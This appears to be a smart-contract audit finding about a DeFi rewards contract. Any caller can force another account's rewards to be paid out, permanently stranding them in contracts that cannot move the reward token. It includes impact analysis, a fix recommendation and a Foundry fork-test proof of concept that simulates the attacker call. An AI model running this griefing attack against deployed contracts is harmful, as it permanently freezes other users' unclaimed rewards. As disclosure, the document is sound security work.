### Title
Permissionless reward claims can permanently lock accrued rewards in contracts without token recovery - ([File: contracts/RewardsDistributor.sol](contracts/RewardsDistributor.sol))

### Summary
`RewardsDistributor.claimRewards` allows any caller to force payout of another account’s accrued rewards to that account, without proving that the account can later move the `rewardToken`. [1](#0-0) [2](#0-1) 

### Finding Description
The public overload accepts arbitrary `accounts_`, updates their accrued balances, and then calls `_transferRewardIfEnoughTokens` for each supplied address. [3](#0-2) 

`_transferRewardIfEnoughTokens` clears `tokensAccruedOf[account_]` and sends the reward directly to `account_`, with no `msg.sender == account_` check, EOA check, callback, or destination authorization. [4](#0-3) 

Contract addresses are valid reward-accruing accounts because collateral deposits can mint `DepositToken` balances to an arbitrary `onBehalfOf_` address. [5](#0-4) [6](#0-5) 

If the receiving contract has no arbitrary ERC20 transfer or recovery method, the forced claim converts its claimable accounting into an ERC20 balance that it can never spend.

### Impact Explanation
An attacker can permanently freeze a contract user’s unclaimed rewards by calling `claimRewards([victim], trackedTokens)`. [3](#0-2) 

The victim loses its accrued reward claim because `tokensAccruedOf[victim]` is reset to zero before the tokens are transferred to the incapable contract. [7](#0-6) 

This meets permanent freezing/theft of unclaimed yield rather than being merely self-inflicted, because the recipient does not authorize or initiate the payout.

### Likelihood Explanation
The attack only requires an unprivileged caller, an active rewards index, a victim contract with accrued rewards, and enough reward-token balance in the distributor. [8](#0-7) [4](#0-3) 

No privileged role, oracle manipulation, reentrancy, or malformed token is required; `nonReentrant` does not prevent the first call. [1](#0-0) 

Likelihood is deployment- and user-dependent: ordinary EOAs are unaffected, and the distributor performs no payout when its reward-token balance is insufficient. [7](#0-6) 

### Recommendation
Require `_msgSender() == account_` for each claimed account, or add an explicitly authorized recipient flow such as `claimRewards(address to, uint256 deadline, bytes signature)` verified against the reward-owning account. [9](#0-8) 

If delegated claims must remain supported, require the account to opt in to forced distribution or implement a recipient confirmation callback before clearing `tokensAccruedOf`. [7](#0-6) 

### Proof of Concept
The following Foundry fork test uses a victim contract that can legitimately hold `DepositToken` but has no method to transfer the unrelated reward token:

```solidity
// test/RewardsDistributorForcedClaim.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDepositTokenLike {
    function deposit(uint256 amount, address onBehalfOf)
        external
        returns (uint256 deposited, uint256 fee);
}

interface IRewardsDistributorLike {
    function claimRewards(address[] calldata accounts, IERC20Like[] calldata tokens) external;
    function claimable(address account) external view returns (uint256);
}

/// @notice Can own msdTOKEN but intentionally has no generic ERC20 rescue path.
contract IncapableHolder {
    function deposit(IDepositTokenLike depositToken, IERC20Like underlying, uint256 amount) external {
        underlying.approve(address(depositToken), amount);
        depositToken.deposit(amount, address(this));
    }
}

contract RewardsDistributorForcedClaimTest is Test {
    function test_forced_claim_locks_contract_rewards() external {
        vm.createSelectFork(vm.envString("BASE_RPC_URL"));

        IERC20Like underlying = IERC20Like(vm.envAddress("UNDERLYING"));
        IERC20Like rewardToken = IERC20Like(vm.envAddress("REWARD_TOKEN"));
        IDepositTokenLike depositToken = IDepositTokenLike(vm.envAddress("DEPOSIT_TOKEN"));
        IRewardsDistributorLike distributor =
            IRewardsDistributorLike(vm.envAddress("REWARDS_DISTRIBUTOR"));

        IncapableHolder victim = new IncapableHolder();
        address attacker = makeAddr("attacker");

        // Give the victim a real collateral position so it accrues rewards.
        deal(address(underlying), address(victim), 100e18);
        victim.deposit(depositToken, underlying, 100e18);

        // Wait until rewards have accrued on the deployed distributor.
        vm.warp(block.timestamp + 1 days);
        uint256 claimableBefore = distributor.claimable(address(victim));
        assertGt(claimableBefore, 0);

        // Any unprivileged account can force settlement to the victim address.
        address[] memory accounts = new address[](1);
        accounts[0] = address(victim);

        IERC20Like[] memory trackedTokens = new IERC20Like[](1);
        trackedTokens[0] = IERC20Like(address(depositToken));

        vm.prank(attacker);
        distributor.claimRewards(accounts, trackedTokens);

        // Rewards are now held by a contract that cannot transfer rewardToken.
        assertEq(distributor.claimable(address(victim)), 0);
        assertGt(rewardToken.balanceOf(address(victim)), 0);
    }
}
```

The decisive assertion is that the attacker’s call clears the victim’s claim while increasing `rewardToken.balanceOf(victim)`, even though `IncapableHolder` exposes no function capable of moving that ERC20 balance. [4](#0-3)
